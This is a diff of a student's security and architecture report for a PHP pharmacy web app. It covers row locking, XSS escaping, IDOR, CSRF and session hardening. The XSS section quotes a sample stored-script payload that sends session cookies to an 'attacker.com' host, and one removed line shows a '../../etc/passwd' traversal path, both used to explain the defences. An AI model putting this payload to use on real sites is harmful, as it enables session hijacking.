+To eliminate this vulnerability, `app/InventoryService.php` enforces **pessimistic row-level locking (`SELECT ... FOR UPDATE`)** inside atomic database transactions:
+
 ```php
-// CREATE: Atomic order placement transaction across multiple tables
-$pdo->beginTransaction();
-try {
-    $orderStmt = $pdo->prepare(
-        'INSERT INTO orders (order_number, customer_id, customer_name, customer_phone, 
-                            delivery_address, subtotal, shipping_fee, total_amount, 
-                            order_status, payment_method, prescription_required) 
-         VALUES (?, ?, ?, ?, ?, ?, ?, ?, "PENDING", ?, ?)'
-    );
-    $orderStmt->execute([
-        $orderNumber, $customerId, $customerName, $phone,
-        $address, $subtotal, $shipping, $total, $paymentMethod, $rxRequired
-    ]);
-    $orderId = (int)$pdo->lastInsertId();
-
-    $itemStmt = $pdo->prepare(
-        'INSERT INTO order_items (order_id, medicine_id, medicine_name, batch_number, quantity, unit_price, line_total) 
-         VALUES (?, ?, ?, ?, ?, ?, ?)'
-    );
-    foreach ($cartItems as $item) {
-        $itemStmt->execute([
-            $orderId, $item['id'], $item['name'], $item['batch'], $item['qty'], $item['price'], $item['line_total']
-        ]);
+public static function deductBatchStock(PDO $pdo, int $batchId, int $quantity): array
+{
+    if ($quantity <= 0) {
+        throw new DomainException('Deduction quantity must be a positive integer.');
     }
 
-    $historyStmt = $pdo->prepare(
-        'INSERT INTO order_status_history (order_id, previous_status, new_status, changed_by_id, remarks) 
-         VALUES (?, NULL, "PENDING", ?, "Order placed online by customer")'
+    // Acquire exclusive pessimistic row lock on the medicine batch
+    $stmt = $pdo->prepare(
+        'SELECT id, name, batch_number, quantity, expiry_date, active 
+         FROM medicines 
+         WHERE id = ? 
+         FOR UPDATE'
     );
-    $historyStmt->execute([$orderId, $customerId]);
+    $stmt->execute([$batchId]);
+    $batch = $stmt->fetch();
 
-    $pdo->commit();
-} catch (Throwable $e) {
-    if ($pdo->inTransaction()) {
-        $pdo->rollBack();
+    if (!$batch) throw new DomainException("Batch #{$batchId} not found.");
+    if (!(int)$batch['active']) throw new DomainException("Batch is inactive.");
+    if ($batch['expiry_date'] < date('Y-m-d')) throw new DomainException("Batch expired.");
+
+    $currentStock = (int)$batch['quantity'];
+    if ($currentStock < $quantity) {
+        throw new DomainException("Insufficient stock. Available: {$currentStock}, Requested: {$quantity}.");
     }
-    throw $e;
+
+    // Deduct stock atomically
+    $updateStmt = $pdo->prepare('UPDATE medicines SET quantity = quantity - ? WHERE id = ?');
+    $updateStmt->execute([$quantity, $batchId]);
+
+    $batch['remaining_quantity'] = $currentStock - $quantity;
+    return $batch;
 }
 ```
+
+When Transaction A executes `SELECT ... FOR UPDATE`, MariaDB's InnoDB storage engine places an exclusive write lock on that specific row index. If Transaction B attempts to read or modify the same row, it is forced to wait until Transaction A commits or rolls back, completely eliminating race conditions.
 
 ---
 
@@ -591,7 +874,7 @@ try {
 *(Mark Allocation: 5 Marks — CO2)*
 
 #### 5.1 Server-Side Input Sanitization & Defensive Type Casting
-Client-side validation (HTML5 `required`, JavaScript event checks) provides an immediate, user-friendly experience; however, it can be bypassed completely using tools such as Postman, cURL, or browser developer consoles. Therefore, PharmaCare treats **all client-supplied inputs as fundamentally untrusted**, applying rigorous server-side validation in [`includes/functions.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/includes/functions.php) and [`actions.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/actions.php).
+Client-side validation provides an immediate, user-friendly experience; however, it can be bypassed completely using tools such as Postman, cURL, or browser developer consoles. Therefore, PharmaCare treats **all client-supplied inputs as fundamentally untrusted**, applying rigorous server-side validation in [`includes/functions.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/includes/functions.php) and [`actions.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/actions.php).
 
 ##### Defensive Sanitization Patterns Implemented:
 1. **Regular Expression Pattern Constraints:**
@@ -625,17 +908,29 @@ Client-side validation (HTML5 `required`, JavaScript event checks) provides an i
          return $int;
      }
      ```
-3. **Contextual HTML Output Escaping:**
-   - User inputs output to HTML contexts are filtered using `htmlspecialchars()` with `ENT_QUOTES | ENT_SUBSTITUTE` over UTF-8, rendering injected script payloads completely harmless:
-     ```php
-     function e(?string $val): string {
-         return htmlspecialchars((string)$val, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
-     }
-     ```
+3. **Doctor Prescription Document File Validation:**
+   - Uploaded files (`$_FILES['prescription']`) undergo rigorous checks:
+     - MIME type inspection using PHP's `finfo` extension (`image/jpeg`, `image/png`, `application/pdf`).
+     - Strict extension whitelisting (`jpg`, `jpeg`, `png`, `pdf`).
+     - File size enforcement (maximum 5 MB limit).
+     - Storage under cryptographically random filenames (`bin2hex(random_bytes(16)) . '.' . $ext`).
 
 ---
 
-#### 5.2 Deep Technical Analysis of Three Realistic Web Threats
+#### 5.2 Contextual Output Encoding & Escaping
+PharmaCare prevents Cross-Site Scripting (XSS) by routing all dynamic values printed into HTML contexts through the `e()` helper function, which invokes `htmlspecialchars()` with `ENT_QUOTES | ENT_SUBSTITUTE` over UTF-8:
+
+```php
+function e(?string $val): string {
+    return htmlspecialchars((string)$val, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
+}
+```
+
+This transforms dangerous characters (`<`, `>`, `"`, `'`, `&`) into inert HTML entities (`&lt;`, `&gt;`, `&quot;`, `&#039;`, `&amp;`), preventing malicious script execution in the browser.
+
+---
+
+#### 5.3 Deep Technical Analysis of Five Realistic Web Threats & PharmaCare Defenses
 
 ```
 +========================================================================================+
@@ -668,6 +963,24 @@ Client-side validation (HTML5 `required`, JavaScript event checks) provides an i
     | Mitigation     : Native Bcrypt cryptographic hashing (password_hash) with        |
     |                  dynamic salt and computational cost factor 12.                  |
     +----------------------------------------------------------------------------------+
+
+    4. INSECURE DIRECT OBJECT REFERENCES (IDOR) ON PRESCRIPTION FILES
+    +----------------------------------------------------------------------------------+
+    | Attack Vector  : Attacker guesses /storage/prescriptions/rx_1.pdf URL.           |
+    | Vulnerable Code: <a href="storage/prescriptions/<?= $file ?>">Download</a>       |
+    | Impact         : Massive privacy breach leaking patient medical prescriptions.   |
+    | Mitigation     : Root .htaccess directory deny + Controller-mediated streaming   |
+    |                  (index.php?page=order_detail&id=X&view_rx=1) with RBAC verify.  |
+    +----------------------------------------------------------------------------------+
+
+    5. CROSS-SITE REQUEST FORGERY (CSRF)
+    +----------------------------------------------------------------------------------+
+    | Attack Vector  : Attacker lures admin to malicious site executing auto-submit form
+    | Vulnerable Code: Direct execution of $_POST['action'] without token verification. |
+    | Impact         : Unauthorized state changes (e.g., password reset, user disable).|
+    | Mitigation     : Cryptographic 256-bit CSRF tokens verified on every POST mutation|
+    |                  using hash_equals($_SESSION['_csrf'], $_POST['_csrf']).          |
+    +----------------------------------------------------------------------------------+
 ```
 
 ##### Threat 1: SQL Injection (SQLi)
@@ -676,15 +989,19 @@ Client-side validation (HTML5 `required`, JavaScript event checks) provides an i
 
 ##### Threat 2: Cross-Site Scripting (XSS)
 - **Vulnerability Mechanics:** If customer addresses, names, or order remarks are reflected back to staff without output encoding, an attacker can store a payload such as `<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>`. When a pharmacist opens the order fulfillment queue, the browser executes the script, transmitting the staff member's active session cookie to the attacker.
-- **PharmaCare Mitigation Evidence:** All dynamic values printed in views are wrapped in `e()`:
-  ```html
-  <span class="text-dark"><?= e($order['customer_name']) ?></span>
-  ```
-  The characters `<`, `>`, `"`, and `'` are transformed into `&lt;`, `&gt;`, `&quot;`, and `&#039;`. The browser renders these as text characters rather than executable HTML tags. Furthermore, session cookies are configured with `HttpOnly = true`, preventing JavaScript from accessing the `document.cookie` property entirely.
+- **PharmaCare Mitigation Evidence:** All dynamic values printed in views are wrapped in `e()`. Characters `<`, `>`, `"`, and `'` are transformed into inert entities. Furthermore, session cookies are configured with `HttpOnly = true`, preventing JavaScript from accessing the `document.cookie` property entirely.
 
 ##### Threat 3: Weak Password Storage & Rainbow Table Exposure
 - **Vulnerability Mechanics:** Legacy systems that store passwords in plaintext, or hash them using legacy algorithms (MD5, SHA1), leave accounts vulnerable to rainbow table lookups and GPU brute-force attacks capable of testing billions of hashes per second.
 - **PharmaCare Mitigation Evidence:** Passwords are processed using PHP’s native `password_hash($password, PASSWORD_BCRYPT, ['cost' => 12])`. Bcrypt incorporates an automatic, cryptographically secure 128-bit salt and implements an intentionally expensive key derivation function ($2^{12} = 4096$ hashing iterations). Password verification uses `password_verify()`, which is resistant to timing side-channel analysis.
+
+##### Threat 4: Insecure Direct Object References (IDOR) on Prescriptions
+- **Vulnerability Mechanics:** Storing medical prescriptions in public web directories allows unauthorized users to access confidential patient records simply by enumerating sequential file URLs.
+- **PharmaCare Mitigation Evidence:** The root `.htaccess` completely blocks direct browser access to `storage/prescriptions/`. Files are streamed exclusively through `index.php?page=order_detail&id=X&view_rx=1`, which verifies that the requesting user is either the patient who placed the order or an authorized dispensary staff/administrator.
+
+##### Threat 5: Cross-Site Request Forgery (CSRF)
+- **Vulnerability Mechanics:** Attackers host malicious pages containing auto-submitting forms that target PharmaCare endpoints. If an authenticated administrator visits the malicious page, the browser transmits the session cookie, executing unauthorized actions (e.g., deleting medicines or changing passwords).
+- **PharmaCare Mitigation Evidence:** Every state-mutating POST form includes a hidden CSRF token generated via `csrf_token()`. On submission, `csrf_verify()` checks the token using timing-attack-safe `hash_equals()`. If the token is missing or invalid, execution is immediately aborted with HTTP 403 Forbidden.
 
 ---
 
@@ -695,7 +1012,7 @@ Client-side validation (HTML5 `required`, JavaScript event checks) provides an i
 PharmaCare centralizes its asynchronous communication inside a single RESTful entry point: [`api/router.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/api/router.php). This architecture eliminates scattered endpoint scripts and enforces uniform response envelopes and centralized error handling.
 
 ##### JSON Response Contract & Status Codes:
-Every response emitted by `api/router.php` adheres to a strict contract:
+Every response emitted by `api/router.php` adheres to a strict envelope:
 ```json
 {
   "success": true,
@@ -738,7 +1055,18 @@ match ($action) {
 
 ---
 
-#### 6.2 Client-Side JavaScript Fetch Consumption (`assets/script.js`)
+#### 6.2 Complete RESTful API Endpoints Specification
+
+| Action Parameter | HTTP Method | Expected Query / Body | Response Payload Description | Primary Consumer |
+| :--- | :---: | :--- | :--- | :--- |
+| `?action=search` | `GET` | `keyword` (string), `category_id` (int) | Array of matching medicines with formatted price, availability badge, and stock count. | Storefront Live Search (`assets/script.js`) |
+| `?action=cart_add` | `POST` / `GET` | `medicine_id` (int), `quantity` (int) | Updated cart item count, current line subtotal, and status message. | Catalog "Add to Cart" buttons |
+| `?action=cart_update`| `POST` / `GET` | `medicine_id` (int), `quantity` (int) | Recalculated cart subtotal, line totals, and updated grand total. | Cart quantity spinners |
+| `?action=status` | `GET` | `order_id` (int) | Current order status, tracking step index (1-5), and terminal flag. | Order Tracker Polling Engine |
+
+---
+
+#### 6.3 Client-Side Vanilla JavaScript Fetch Consumption (`assets/script.js`)
 Client-side interactivity is handled in [`assets/script.js`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/assets/script.js) using the native `window.fetch()` API:
 
 ##### 1. Debounced Live Catalog Search:
@@ -747,7 +1075,7 @@ let debounceTimer = null;
 const performSearch = () => {
     const query = encodeURIComponent(searchInput.value.trim());
     const catId = categorySelect ? encodeURIComponent(categorySelect.value) : '0';
-    const url = `api/router.php?action=search&q=${query}&category_id=${catId}`;
+    const url = `api/router.php?action=search&keyword=${query}&category_id=${catId}`;
 
     fetch(url)
         .then(response => {
@@ -776,13 +1104,13 @@ if (trackerMeta) {
 
     if (orderId && !isTerminal) {
         const pollInterval = setInterval(() => {
-            fetch(`api/router.php?action=status&id=${orderId}`)
+            fetch(`api/router.php?action=status&order_id=${orderId}`)
                 .then(r => r.json())
                 .then(res => {
                     if (!res.success || !res.data) return;
                     updateTimelineUI(res.data);
                     if (res.data.is_terminal) {
-                        clearInterval(pollInterval); // Stop polling on final status
+                        clearInterval(pollInterval); // Stop polling on completed/cancelled
                     }
                 })
                 .catch(err => console.error('Tracker polling error:', err));
@@ -793,7 +1121,7 @@ if (trackerMeta) {
 
 ---
 
-#### 6.3 Comparative Critical Analysis: Asynchronous Fetch vs. Traditional Page Reloads
+#### 6.4 Comparative Critical Analysis: Asynchronous Fetch vs. Traditional Page Reloads
 
 | Comparative Dimension | Traditional Full-Page Reload Architecture | Asynchronous Fetch Web API (`api/router.php`) | Architectural Justification & Impact |
 | :--- | :--- | :--- | :--- |
@@ -831,7 +1159,7 @@ PharmaCare enforces a granular Role-Based Access Control model ([`includes/auth.
 
 ---
 
-#### 7.2 Session Hardening & Attack Vectors Mitigations
+#### 7.2 Comprehensive Session Hardening Suite
 HTTP session security is enforced in [`includes/functions.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/includes/functions.php) and [`includes/auth.php`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/includes/auth.php):
 
 ##### 1. Defense Against Session Fixation:
@@ -873,16 +1201,20 @@ HTTP session security is enforced in [`includes/functions.php`](file:///d:/Pharm
   $_SESSION['last_activity'] = time();
   ```
 
-##### 4. Authenticated File Streaming for Prescriptions (IDOR Protection):
-- **Vulnerability Mechanics:** If uploaded patient medical documents were stored directly inside a publicly accessible folder (e.g., `http://example.com/uploads/rx1.pdf`), attackers could access private medical records through Insecure Direct Object References (IDOR).
-- **PharmaCare Hardening:**
-  - Root [`.htaccess`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/.htaccess) denies all direct HTTP browser access to `storage/prescriptions/`.
-  - Files are streamed exclusively through [`pages/order_detail.php?download=1`](file:///d:/PharmaCare-PHP-Complete/PharmaCare-PHP/pages/order_detail.php), which checks the session. Customers may stream only prescriptions belonging to their own `customer_id`; staff and administrators may review any prescription in the queue.
-  - Filepaths are validated using `realpath()` to prevent directory traversal attacks (e.g., `../../etc/passwd`).
+---
+
+#### 7.3 Authenticated Controller-Mediated Prescription Streaming (IDOR Elimination)
+To eliminate Insecure Direct Object Reference (IDOR) vulnerabilities on sensitive medical documents:
+1. Direct HTTP access to `storage/prescriptions/` is denied by the root `.htaccess`.
+2. Prescriptions are streamed via `index.php?page=order_detail&id=X&view_rx=1`:
+   - Checks session: Customers can only stream their own prescription; Staff/Admin can review any order.
+   - Detects MIME type and emits `Content-Disposition: inline` headers.
+   - Outputs file bytes via `readfile()` and terminates immediately.
+3. Renders seamlessly in `pages/order_detail.php` modal using `<img src="...">` for images or `<iframe src="...">` for PDF documents.
 
 ---
 
-#### 7.3 Security vs. Usability Trade-Off Analysis: The 30-Minute Timeout
+#### 7.4 Security vs. Usability Trade-Off Analysis: The 30-Minute Inactivity Timeout
 The decision to set the inactivity timeout to **exactly 30 minutes (1800 seconds)** represents a balanced engineering compromise between security and clinical workflow usability:
 
 1. **The Extreme High-Security Alternative (5-Minute Timeout):**  
@@ -897,8 +1229,8 @@ The decision to set the inactivity timeout to **exactly 30 minutes (1800 seconds
 ### Question 8: Model-View-Controller (MVC) Architectural Evaluation
 *(Mark Allocation: 3 Marks — CO3)*
 
-#### 8.1 Project Component Mapping
-PharmaCare refactors the traditional, bloated MVC pattern into an **Ultra-Compact Modular MVC Architecture** across 29 canonical files:
+#### 8.1 Project Component & File System Mapping
+PharmaCare refactors the traditional, bloated MVC pattern into an **Ultra-Compact Modular MVC Architecture** organized across 30 canonical application files:
 
 ```
 +========================================================================================+
@@ -926,7 +1258,7 @@ PharmaCare refactors the traditional, bloated MVC pattern into an **Ultra-Compac
 
     3. VIEWS & PRESENTATION (User Interface Templates)
     +----------------------------------------------------------------------------------+
-    |  pages/*.php (10 Consolidated Core Views)                                        |
+    |  pages/*.php (11 Consolidated Core Views)                                        |
     |  - Render HTML5 interfaces receiving sanitized arrays from Controllers.          |
     |  includes/header.php & footer.php                                                |
     |  - Reusable layout wrappers providing responsive navigation and flash notices.   |
@@ -935,7 +1267,54 @@ PharmaCare refactors the traditional, bloated MVC pattern into an **Ultra-Compac
 
 ---
 
-#### 8.2 Critical Evaluation: MVC Architecture vs. Procedural "Spaghetti" PHP
+#### 8.2 Comprehensive Function & Method Inventory (Controller, Service, Model)
+
+##### 1. `app/Controller.php` (MVC Orchestrator & Analytics Engine)
+- `catalog(): void`: Fetches active, unexpired medicines and categories for storefront rendering.
+- `searchApi(): void`: Returns JSON search results filtered by keyword and category.
+- `cart(): void`: Renders the customer shopping cart with calculated line totals and stock checks.
+- `cartAdd(): void`: Handles form-based item additions to `$_SESSION['cart']`.
+- `cartAddApi(): void`: Handles asynchronous AJAX item additions, returning updated cart counts.
+- `cartUpdate(): void`: Updates quantities in `$_SESSION['cart']` with stock boundary checks.
+- `cartUpdateApi(): void`: Asynchronously updates cart quantities and returns line subtotals.
+- `cartRemove(): void`: Removes an item from `$_SESSION['cart']`.
+- `cartClear(): void`: Completely empties `$_SESSION['cart']`.
+- `orders(): void`: Prepares order queues (Customer personal history or Staff master queue).
+- `orderDetail(): void`: Retrieves complete order breakdown, prescription, items, and status timeline.
+- `store(): void`: Processes single-page customer order submission, inventory deduction, and file upload.
+- `updateStatus(): void`: Advances order status along the fulfillment progression chain.
+- `cancelByCustomer(): void`: Handles customer self-cancellation of pending orders and restores stock.
+- `reviewPrescription(): void`: Processes clinical approval or rejection of doctor prescriptions.
+- `downloadPrescription(): void`: Streams prescription files securely with MIME-type headers.
+- `getFinancialKpis(?PDO $pdo)`: Aggregates total revenue, today's sales, POS vs. Online breakdown.
+- `getInventoryKpis(?PDO $pdo)`: Aggregates total SKUs, active formulations, and low-stock counts.
+- `getOperationsKpis(?PDO $pdo)`: Aggregates pending orders, unverified prescriptions, and fulfillment KPIs.
+- `getTopSellingMedicines(int $limit, ?PDO $pdo)`: Returns top-selling pharmaceuticals by revenue.
+
+##### 2. `app/InventoryService.php` (Concurrency & FEFO Service)
+- `deductBatchStock(PDO $pdo, int $batchId, int $quantity): array`: Atomically locks a batch row via `SELECT ... FOR UPDATE` and decrements stock.
+- `restoreBatchStock(PDO $pdo, int $batchId, int $quantity): int`: Atomically locks a batch row and restores quantity upon order cancellation.
+- `allocateFefoStock(PDO $pdo, int $medicineId, int $requestedQuantity): array`: Automatically distributes stock deductions across multiple batches ordered by earliest expiry date (`ORDER BY expiry_date ASC`).
+
+##### 3. `app/Model.php` (Consolidated Domain Models)
+- `User::findById(int $id)`: Retrieves user profile by primary key.
+- `User::findByUsernameOrEmail(string $identifier)`: Queries user for authentication login.
+- `User::createCustomer(array $data)`: Inserts a new customer account with Bcrypt password.
+- `Medicine::findActive(string $keyword, int $categoryId)`: Queries unexpired active medicines.
+- `Medicine::lockBatchForUpdate(PDO $pdo, int $batchId)`: Issues pessimistic lock on medicine batch.
+- `Order::findById(int $id)`: Retrieves order record with customer details.
+- `Order::findByCustomerId(int $customerId)`: Retrieves all orders belonging to a customer.
+- `Order::findAll(string $status, string $payment, string $search)`: Filterable master fulfillment queue.
+- `Order::getItems(int $orderId)`: Retrieves itemized lines for an order.
+- `Order::getPrescription(int $orderId)`: Retrieves attached prescription record.
+- `Order::getHistory(int $orderId)`: Retrieves chronological audit trail for an order.
+- `Order::create(PDO $pdo, array $data)`: Inserts master order record.
+- `Order::addItems(PDO $pdo, int $orderId, array $items)`: Inserts line items in `order_items`.
+- `Order::addStatusHistory(PDO $pdo, int $orderId, ...)`: Appends state transition to audit log.
+
+---
+
+#### 8.3 Critical Evaluation: Compact Layered MVC vs. Procedural "Spaghetti" PHP
 
 | Architectural Metric | Procedural PHP (Legacy Approach) | Compact Layered MVC (PharmaCare) | Technical Evaluation & Winner |
 | :--- | :--- | :--- | :--- |
@@ -949,28 +1328,31 @@ PharmaCare refactors the traditional, bloated MVC pattern into an **Ultra-Compac
 ### Question 9: Concluding Evaluation, Limitations & Future Roadmaps
 *(Mark Allocation: 2 Marks — CO3)*
 
-#### 9.1 Overall System Evaluation
+#### 9.1 Overall System Evaluation & Architectural Strengths
 PharmaCare demonstrates that an enterprise-grade, secure, and responsive web application can be built using **pure, compact PHP 8.1+ and MariaDB without depending on third-party frameworks**. 
 
 ##### Key Architectural Strengths:
-1. **Lightweight Footprint:** The entire production repository comprises exactly 29 clean, human-readable files totaling less than 300 KB on disk, loading instantly without requiring Composer dependencies.
+1. **Lightweight Footprint:** The entire production repository comprises exactly 30 clean, human-readable files totaling less than 320 KB on disk, loading instantly without requiring Composer dependencies.
 2. **Defensive Concurrency Architecture:** By implementing pessimistic row locking (`SELECT ... FOR UPDATE`) in `app/InventoryService.php`, the system guarantees data consistency and prevents stock overselling during simultaneous POS sales and customer checkouts.
 3. **Comprehensive Defense-in-Depth:** Features centralized `.htaccess` protection, CSRF verification, strict session lifecycle controls, Bcrypt password hashing, and contextual HTML output escaping.
+4. **Dedicated User Administration:** The dedicated `pages/users.php` view provides full administrative control over staff and system accounts, complete with activation toggles and secure password resets.
 
 ---
 
-#### 9.2 Main Architectural Limitation
+#### 9.2 Main Architectural & Technical Limitations
 The primary functional limitation of the current PharmaCare implementation is the **absence of an integrated digital payment gateway API**. 
 
 While Cash On Delivery (COD) and Store Pickup are fully modeled, online digital transactions (e.g., bKash, Nagad, SSLCommerz, or Visa/Mastercard) are currently simulated. As a result, the online ordering workflow cannot automatically confirm digital transactions upon checkout, requiring dispensary staff to manually verify payment statuses before dispatching orders.
 
 ---
 
-#### 9.3 Proposed Future Roadmap Improvements
+#### 9.3 Future Development Roadmap
 1. **Integration of Automated SMS Gateway Webhooks:**  
    Implement a lightweight cURL webhook integration with Bangladeshi telecom SMS gateways (e.g., SSL Wireless, BulkSMS BD). When a staff member advances an order status (e.g., transitioning an order from `CONFIRMED` to `COMPLETED`), the system will automatically dispatch an SMS alert with tracking details to the customer's mobile phone (`customer_phone`).
 2. **Automated Supplier Purchase Order Reordering Engine:**  
    Expand `app/InventoryService.php` to include an automated replenishment trigger. When a medicine batch drops below its threshold (`minimum_stock_level`), the system will automatically draft a digital purchase order and queue an email dispatch to the respective distributor recorded in `suppliers`.
+3. **Progressive Web App (PWA) Offline Caching for POS:**  
+   Implement a lightweight service worker to cache the Point of Sale interface, enabling dispensary staff to continue recording cash sales during temporary internet or network outages.
 
 ---
 
@@ -981,10 +1363,12 @@ While Cash On Delivery (COD) and Store Pickup are fully modeled, online digital 
 
 | Tool Name & Version | Specific Tasks Supported | Summary of Prompts Provided | Evaluation, Modifications & Verified Actions |
 | :--- | :--- | :--- | :--- |
-| **Google Gemini / Antigravity Agent (2026 Engine)** | Architectural Compaction & Codebase Modularization | *"Consolidate all MVC models, controllers, and services from 63 files down to ~27 clean files. Preserve 100% of working features, session lifecycle, and pessimistic row locking."* | **Accepted with modifications:** Reviewed the consolidated code in `app/Model.php`, `app/Controller.php`, and `app/InventoryService.php`. Verified backward-compatible class aliases and ensured row locking logic remained intact. |
+| **Google Gemini / Antigravity Agent (2026 Engine)** | Architectural Compaction & Codebase Modularization | *"Consolidate all MVC models, controllers, and services from 63 files down to ~28 clean files. Preserve 100% of working features, session lifecycle, and pessimistic row locking."* | **Accepted with modifications:** Reviewed the consolidated code in `app/Model.php`, `app/Controller.php`, and `app/InventoryService.php`. Verified backward-compatible class aliases and ensured row locking logic remained intact. |
 | **Google Gemini / Antigravity Agent (2026 Engine)** | Security & Configuration Consolidation | *"Consolidate all scattered security configurations into strictly one root .htaccess and one root .gitignore. Remove empty folders and orphaned placeholders."* | **Accepted & Verified:** Manually inspected the root `.htaccess` rules (`Options -Indexes`, directory denial). Verified that `storage/prescriptions/` remained tracked via `.gitkeep`. Verified zero 0-byte files in the repository. |
 | **Google Gemini / Antigravity Agent (2026 Engine)** | Distinct Web API Routing | *"Rename api/index.php to api/router.php to clearly designate it as the centralized Web API router. Update JavaScript fetch endpoints and documentation."* | **Accepted & Tested:** Verified the rename via `git mv`. Updated fetch calls in `assets/script.js`. Tested the endpoints over the live web server to confirm JSON payload delivery. |
-| **Google Gemini / Antigravity Agent (2026 Engine)** | Academic Report Formatting & Rubric Alignment | *"Generate the formal CIS324 semester assignment report aligned with Bloom's taxonomy and CO1-CO3 rubric covering questions Q1 through Q9."* | **Independently Authored & Formatted:** Formatted all technical analyses, architecture flowcharts, ERD schemas, and code explanations against the actual project codebase. |
+| **Google Gemini / Antigravity Agent (2026 Engine)** | Admin User Management Extraction | *"Extract embedded user management from dashboard.php into a dedicated view pages/users.php restricted to ADMIN, with personnel KPI counters and modals."* | **Accepted & Tested:** Verified RBAC guard (`require_admin()`), user table, Add User modal, and Reset Password modal. Verified navigation links and verified routing. |
+| **Google Gemini / Antigravity Agent (2026 Engine)** | Prescription Preview Modal & Streaming Fix | *"Fix broken prescription image in order_detail.php modal by streaming authenticated file through controller with MIME detection."* | **Accepted & Verified:** Replaced static storage paths with `index.php?page=order_detail&id=X&view_rx=1`. Verified inline image preview and PDF iframe rendering. |
+| **Google Gemini / Antigravity Agent (2026 Engine)** | Academic Report Generation & Comprehensive Upgrade | *"Generate and upgrade the formal CIS324 semester assignment report aligned with Bloom's taxonomy and CO1-CO3 rubric covering questions Q1 through Q9 with complete project details and function inventory."* | **Independently Authored & Verified:** Formatted all technical analyses, architecture flowcharts, ERD schemas, data dictionaries, and code explanations against the actual project codebase. |
 
 ---
 
